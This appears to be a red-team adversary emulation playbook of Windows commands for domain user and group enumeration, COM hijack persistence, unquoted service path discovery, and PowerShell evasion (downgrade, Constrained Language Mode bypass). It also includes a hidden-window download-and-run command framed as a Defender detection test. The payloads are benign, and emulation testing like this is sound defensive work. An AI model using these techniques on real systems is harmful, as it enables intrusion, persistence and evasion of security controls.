# **Adversary Emulation Test**

# **Table Of Contents:**
<!--ts-->
  * [Initial Access](#initial-access)
  * [Host Enumeration](#host-enumeration)
  * [Domain Enumeration](#domain-enumeration)
    * [User Enumeration](#user-enumeration)
      * [All User Accounts with Admin in Name](#all-user-accounts-with-admin-in-name)
    * [Group Enumeration](#group-enumeration)
  * [Execution](#execution)
    * [PowerShell NET Assembly](#powershell-net-assembly)
  * [Persistence](#persistence)
    * [COM Hijacking](#com-hijacking)
    * [DLL Hijacking](#dll-hijacking)
  * [Privilege Escalation](#privilege-escalation)
    * [Unquoted Service Path](#unquoted-service-path)
  * [Lateral Movement](#lateral-movement)
  * [Exfiltration](#exfiltration)
  * [Misc](#misc)
    * [PowerShell](#powershell)
      * [PowerShell Downgrade](#powershell-downgrade)
      * [Constrained Language Mode](#constrained-language-mode)
      * [AMSI Bypass](#amsi-bypass)
<!--te-->

# **Domain Enumeration**

## **User Enumeration**

### **Get All Domain Users**

```
net.exe user /DOMAIN
```

### **All User Accounts with Admin in Name**

```
net.exe user /DOMAIN | Select-String -SimpleMatch "admin"
```

### **Enumerate A Specific Admin User**

```
net.exe user <username> /DOMAIN | FL -Property *
```

## **Group Enumeration**

### **Enumerate All Domain Groups**

```
net.exe groupv /DOMAIN
```

### **Enumerate Groups with *Admin* in Name**

```
net.exe group /DOMAIN | Select-String -SimpleMatch "admin"
```

# **Execution**

## **PowerShell NET Assembly**

### **Execute *calc.exe* Using NET Assembly Method**

```
# No-download method (calc.exe already exists on system)
[System.Diagnostics.Process]::Start("calc.exe")
```

# **Persistence**

## **COM Hijacking**

**NOTE:**

For COM Hijacks you need a DLL to point to to execute. I created a DLL that runs *C:\Windows\System32\calc.exe* which you can use during the test and placed it in this GitHub Repo.

### **Enumerating COM Hijack Opportunities with ProcMon**

![image](https://github.com/user-attachments/assets/3d79926f-0854-4130-9dfb-47416b5248d3)


### **Enumerating Scheduled Tasks That Call COM Objects**

```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

### **Creating New InprocServer32 Registry Key/Value Pair**

```
# Create New CLSID Registry Key in HKCU where it was not defined
New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{<CLISD-ID>}"

# Set the InprocServer32 Key to point to your DLL
New-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}" -Name "InprocServer32" -Value "<Path-To-DLL>"

# Set threading to where this DLL gets executed on any COM object calls for this CLSID
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"

# Valid COM Object Registry properly set
Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"

# Clean Up
Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
```

### **Common COM Objects to Target**

```
# TODO
```

# **Privilege Escalation**

## **Unquoted Service Path**

### **Enumeration of Unquoted Service Paths**

```
# Get all Serices
$services = Get-WmiObject -Class Win32_Service | Select-Object Name, PathName

# Pull out the service executable paths
$paths = $services.PathName

# Get Paths with Spaces
$vulnerable_paths = @()

foreach ($path in $paths)
{
    $executable = "$($($path -split '\.exe')[0])" + ".exe"
    if ($executable -contains " " -and -not $executable -contains "`"")
    {
        $vulnerable_paths += $executable
    } 
}

$vulnerable_paths
```

# **Misc**

## **Defender For Endpoint Test Detection**

```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
```

## **PowerShell**

### **PowerShell Downgrade**

```
# Test command before downgrade
echo "Mimikatz"

# Downgrade PowerShell to Version 2 which has less protections
powershell -version 2

# Test command after downgrade
echo "Mimikatz"
```

### **Constrained Language Mode**

#### **Detecting Constrained Language Mode**

```
$ExecutionContext.SessionState.LanguageMode
```

### **Circumvent Constrained Language Mode**

You can try the PowerShell downgrade attack mentioned above which should get you into a session with FullLanguage Mode

#### **System32 Bypass**

Create *test.ps1*

```
# Contents of test.ps1
$ExecutionContext.SessionState.LanguageMode
```

Run the following command:

```
# There is a bypass where if the string *System32* is in the path of the script it will gain FullLanguag Mode

.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
```
